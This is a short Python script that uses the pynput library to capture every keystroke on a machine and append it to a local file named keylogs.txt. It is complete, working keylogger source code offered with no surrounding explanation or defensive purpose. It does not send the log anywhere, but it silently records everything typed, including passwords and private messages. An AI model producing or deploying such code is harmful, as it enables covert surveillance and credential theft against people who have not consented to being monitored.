```python
import os
from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as file:
            if hasattr(key, 'char'):
                file.write(key.char)
            elif key == keyboard.Key.space:
                file.write(' ')
            else:
                file.write(f'[{str(key)}]')
    except Exception as e:
        print(f"Error occurred: {e}")

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
```